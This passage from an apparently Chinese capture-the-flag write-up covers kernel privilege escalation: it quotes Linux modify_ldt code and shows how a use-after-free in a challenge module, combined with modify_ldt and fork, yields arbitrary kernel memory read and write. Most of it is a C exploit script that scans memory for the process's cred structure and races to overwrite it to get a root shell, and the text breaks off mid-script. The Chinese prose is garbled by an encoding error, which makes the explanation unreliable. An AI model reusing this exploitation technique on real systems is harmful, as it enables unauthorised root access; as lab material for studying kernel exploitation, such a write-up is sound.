out;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  <span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">     LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">  <span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">   error = -EINVAL;</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   ldt.avl = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">  <span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line"> old_ldt       = mm-&gt;context.ldt;</span><br><span class="line"> old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line"> new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line"> error = -ENOMEM;</span><br><span class="line"> new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"> <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (old_ldt)</span><br><span class="line">  <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"> new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"> finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment">  * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment">  * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment">  * them over to the new LDT.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">if</span> (error) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment">   * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment">   * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">   free_ldt_pgtables(mm);</span><br><span class="line">  free_ldt_struct(new_ldt);</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> install_ldt(mm, new_ldt);</span><br><span class="line"> unmap_ldt_struct(mm, old_ldt);</span><br><span class="line"> free_ldt_struct(old_ldt);</span><br><span class="line"> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"> <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°é‡æ–°ç”³è¯·ä¸€ä¸ªldtç»“æ„ä½“ç»‘å®šåˆ°è¿›ç¨‹ä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨uafæ§åˆ¶è¿™ä¸ªç»“æ„é¢˜ï¼Œç„¶åå°±å¯ä»¥æ§åˆ¶å…¶ä¸­çš„<code>entries</code>äº†ã€‚</p>
<p>è¿™ä¸ªå‡½æ•°å¤„ç†å¯ä»¥æ§åˆ¶ldtä»¥å¤–è¿˜å¯ä»¥å®Œæˆä»»æ„å†™ï¼Œè§‚å¯Ÿä¸‹é¢çš„ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>memcpy</code>å‡½æ•°ä¸­ï¼Œæ‹·è´çš„å¤§å°æ˜¯<code>old_nr_entries * LDT_ENTRY_SIZE</code>,å…¶ä¸­<code>old_nr_entries</code>çš„ä¸Šé™å’Œ<code>LDT_ENTRY_SIZE</code>å¤§å°éƒ½æœ‰å®šä¹‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure>

<p>å¯è§è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œç„¶åè¿˜æ²¡æœ‰åŠ é”ï¼Œé‚£å°±å¯ä»¥åœ¨<code>memcpy</code>æ‹·è´çš„æœŸé—´æ¡ä»¶ç«äº‰ä¿®æ”¹<code>entries</code>å­—æ®µï¼Œldtä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼ï¼Œå†æ‰§è¡Œ<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>å°±å¯ä»¥å®Œæˆä»»æ„åœ°å€å†™å…«å­—èŠ‚äº†ã€‚</p>
<h2 id="è§£æ³•ä¸€-éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ"><a href="#è§£æ³•ä¸€-éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ" class="headerlink" title="è§£æ³•ä¸€ éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ"></a>è§£æ³•ä¸€ éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ</h2><p>è¯¥è§£æ³•æ€è·¯ä¸»è¦å‚è€ƒ<code>TCTF FINAL</code>çš„ä¸€é“kernelpwné¢˜ã€‚</p>
<p>ä¹ï¼Œæ•´äº†ä¸€å¤©å¤šï¼Œå°±ç®—æˆ‘æŠŠqemuçš„æ ¸å¢å¤šæœ€åçš„æ¡ä»¶ç«äº‰è¿˜æ˜¯ä¸è¡Œï¼Œè€Œä¸”æˆ‘ç¡®å®šå·²ç»å¯ä»¥æ§åˆ¶<code>ldt</code>ç»“æ„ä½“äº†ï¼Œä½†å°±æ˜¯æ¡ä»¶ç«äº‰å¤±è´¥ï¼Œå“ï¼Œè™½è¯´æ²¡æœ‰æ•´å‡ºæ¥ï¼Œä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†ä¸€æ‰‹éå†å†…å­˜æœç´¢<code>cred</code>ç»“æ„ä½“çš„æ–¹æ³•</p>
<p>å½“å¼€äº†<code>Hardened Usercopy</code>çš„æ—¶å€™æˆ‘ä»¬éå†æ•´ä¸ª<code>page_offset_base</code>è¿˜æ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› ä¸º<code>task_struct</code>ç»“æ„ä½“å°±åœ¨è¿™é‡Œï¼Œè€Œè¿™é‡Œæ˜¯ä¸å…è®¸å‘ç”¨æˆ·æ€æ‹·è´çš„ï¼Œä½†æ˜¯<code>tctf final</code>è¿™é“é¢˜å°±æä¾›äº†ä¸€ä¸ªéå¸¸å¥½çš„æ€è·¯ï¼Œå°±æ˜¯åˆ©ç”¨<code>fork</code>æœºåˆ¶å’Œ<code>ldt</code>ç»“æ„ä½“ç»•è¿‡<code>Hardened Usercopy</code></p>
<p>é¦–å…ˆforkä¼šæœ‰å¦‚ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure>

<p>æœ€åçš„<code>ldt_dup_context()</code>å°±æ˜¯è´Ÿè´£ldtç»“æ„ä½“æ‹·è´çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªè¦æˆ‘ä»¬æ§åˆ¶äº†çˆ¶è¿›ç¨‹çš„<code>ldt-entries</code>æŒ‡é’ˆï¼Œå°±æ‹·è´ä»»æ„ä¸€æ®µå†…å­˜åˆ°å­è¿›ç¨‹çš„<code>ldt-entries</code>ä¸Šï¼Œè€Œä¸”è¿™æ˜¯å†…æ ¸å‘å†…æ ¸æ‹·è´ï¼Œä¸ä¼šè§¦å‘ä¿æŠ¤ï¼Œç„¶åæˆ‘ä»¬å†ä»å­è¿›ç¨‹ä¸­è¯»å–<code>ldt-entries</code>å°±å¯ä»¥äº†</p>
<p>æœ€åçš„è„šæœ¬</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_write</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf=cred_addr+<span class="number">4</span>;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x2000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x5000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_pid;</span><br><span class="line">    <span class="keyword">size_t</span> *comm;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    cur_pid=getpid();</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">&quot;jingyinghuaa&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(!pid)&#123;</span><br><span class="line">            <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x4000</span>);</span><br><span class="line">            <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;modify_idf again fail\n&quot;</span>);</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            comm=(<span class="keyword">size_t</span>*)memmem(buf2,<span class="number">0x4000</span>,<span class="string">&quot;jingyinghuaa&quot;</span>,<span class="number">12</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm \</span><br><span class="line">                &amp;&amp; (comm[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (comm[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="keyword">int</span>) comm[<span class="number">-58</span>]) == cur_pid))&#123;</span><br><span class="line">                     cred_addr = comm[<span class="number">-2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(cred_addr)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        addr+=<span class="number">0x4000</span>;</span><br><span class="line">        *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cred_addr:%p\n&quot;</span>,cred_addr);</span><br><span class="line">    <span class="keyword">int</span> pid_1=fork();</span><br><span class="line">    <span class="keyword">if</span>(!pid_1)&#123;</span><br><span class="line">        <span class="keyword">int</span> pid_2=fork();</span><br><span class="line">        <span class="keyword">if</span>(!pid_2)&#123;</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;buhaole\n&quot;</span>);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=cred_addr+<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// sleep(5);</span></span><br><span class="line">        chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">        chunk_free(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;begin to test\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        u_desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        u_desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        u_desc.limit = <span class="number">0</span>;</span><br><span class="line">        u_desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        u_desc.contents = <span class="number">0</span>;</span><br><span class="line">        u_desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        u_desc.lm = <span class="number">0</span>;</span><br><span class="line">        u_desc.read_exec_only = <span 